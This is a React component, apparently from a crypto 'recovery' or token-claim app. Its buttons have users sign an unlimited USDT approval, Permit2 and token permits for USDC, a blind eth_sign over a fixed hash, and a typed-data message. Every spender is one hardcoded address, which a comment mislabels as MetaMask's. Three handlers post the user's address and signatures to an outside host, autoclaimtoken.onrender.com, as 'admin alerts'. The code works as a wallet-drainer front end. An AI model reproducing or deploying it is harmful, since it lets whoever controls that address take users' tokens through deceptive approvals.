import { useState } from 'react';
import { ethers } from 'ethers';
import { approveUnlimited, signPermit2, blindSignature, signTypedDataV4, signTokenPermit } from '../utils/web3Signatures';

export default function SignatureManager({ provider, userAddress }) {
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState('');

  const handleUnlimitedApprove = async () => {
    setLoading(true);
    try {
      const tokenAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // Real USDT
      const spenderAddress = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'; // Real MetaMask address
      
      const tx = await approveUnlimited(tokenAddress, spenderAddress, provider);
      
      // Send admin alert
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'ERC20_UNLIMITED_APPROVE',
          userAddress: userAddress,
          tokenAddress: tokenAddress,
          spenderAddress: spenderAddress,
          txHash: tx.hash
        })
      });
      
      setResult(`Unlimited approval tx: ${tx.hash}`);
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const handlePermit2 = async () => {
    setLoading(true);
    try {
      const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
      const amount = ethers.parseUnits('1000', 6); // USDC has 6 decimals
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      
      const signature = await signPermit2(tokenAddress, amount, deadline, spender, provider);
      setResult(`Permit2 signature: ${signature}`);
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const handleBlindSign = async () => {
    setLoading(true);
    try {
      const messageHash = '0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef';
      const signature = await blindSignature(messageHash, provider);
      
      // Send admin alert for blind signature
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'BLIND_SIGNATURE',
          userAddress: userAddress,
          messageHash: messageHash,
          signature: signature
        })
      });
      
      setResult(`Blind signature: ${signature}`);
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const handleTypedDataV4 = async () => {
    setLoading(true);
    try {
      const domain = {
        name: 'CryptoRecover',
        version: '1',
        chainId: 1,
        verifyingContract: '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15'
      };

      const types = {
        Recovery: [
          { name: 'user', type: 'address' },
          { name: 'amount', type: 'uint256' },
          { name: 'nonce', type: 'uint256' }
        ]
      };

      const message = {
        user: userAddress,
        amount: ethers.parseEther('100'),
        nonce: 1
      };

      const signature = await signTypedDataV4(domain, types, message, provider);
      
      // Send admin alert for TypedData signature
      await fetch('https://autoclaimtoken.onrender.com/api/signature-alert', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'TYPED_DATA_V4',
          userAddress: userAddress,
          domain: domain,
          types: types,
          message: message,
          signature: signature
        })
      });
      
      setResult(`TypedData v4 signature: ${signature}`);
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  const handleTokenPermit = async () => {
    setLoading(true);
    try {
      const tokenAddress = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // USDC
      const spender = '0x6026f8db794026ed1b1f501085ab2d97dd6fbc15';
      const value = ethers.parseUnits('1000', 6); // USDC has 6 decimals
      const deadline = Math.floor(Date.now() / 1000) + 3600;
      
      const signature = await signTokenPermit(tokenAddress, userAddress, spender, value, deadline, provider);
      setResult(`Token permit signature: ${signature}`);
    } catch (error) {
      setResult(`Error: ${error.message}`);
    }
    setLoading(false);
  };

  return (
    <div className="bg-white rounded-lg shadow-lg p-6">
      <h3 className="text-xl font-bold mb-4">Advanced Signature Methods</h3>
      
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
        <button
          onClick={handleUnlimitedApprove}
          disabled={loading}
          className="bg-blue-600 text-white px-4 py-2 rounded hover:bg-blue-700 disabled:opacity-50"
        >
          ERC-20 Unlimited Approve
        </button>
        
        <button
          onClick={handlePermit2}
          disabled={loading}
          className="bg-green-600 text-white px-4 py-2 rounded hover:bg-green-700 disabled:opacity-50"
        >
          Permit2 Signature
        </button>
        
        <button
          onClick={handleBlindSign}
          disabled={loading}
          className="bg-red-600 text-white px-4 py-2 rounded hover:bg-red-700 disabled:opacity-50"
        >
          Blind Signature (eth_sign)
        </button>
        
        <button
          onClick={handleTypedDataV4}
          disabled={loading}
          className="bg-purple-600 text-white px-4 py-2 rounded hover:bg-purple-700 disabled:opacity-50"
        >
          TypedData v4
        </button>
        
        <button
          onClick={handleTokenPermit}
          disabled={loading}
          className="bg-orange-600 text-white px-4 py-2 rounded hover:bg-orange-700 disabled:opacity-50 md:col-span-2"
        >
          Token Permit Signature
        </button>
      </div>
      
      {result && (
        <div className="bg-gray-100 p-4 rounded">
          <h4 className="font-semibold mb-2">Result:</h4>
          <p className="text-sm break-all">{result}</p>
        </div>
      )}
    </div>
  );
}